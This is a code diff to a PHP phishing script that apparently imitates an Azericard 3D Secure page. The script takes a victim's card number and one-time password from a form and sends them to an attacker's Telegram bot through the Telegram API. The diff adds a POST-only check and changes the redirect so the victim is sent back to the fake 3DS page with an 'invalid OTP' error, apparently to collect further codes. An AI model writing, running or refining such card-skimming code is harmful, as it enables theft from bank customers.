@@ -1,4 +1,9 @@
 <?php
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(403);
+    exit('Access Denied');
+}
+
 $otp = $_POST['otp'] ?? '';
 $card = $_POST['card'] ?? '';
 
@@ -9,7 +14,7 @@ $message = "3D Secure OTP:\nKart: $card\nOTP: $otp";
 $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
 @file_get_contents($url);
 
-// OTP göndərildikdən sonra gözləmə səhifəsinə yönləndiririk
-header("Location: /azericard/wait.html?card=" . urlencode($card));
+// 404 xətası yerinə uğurlu səhifəyə yönləndiririk
+header("Location: /azericard/azericard-3ds.html?error=invalid_otp");
 exit();
 ?>
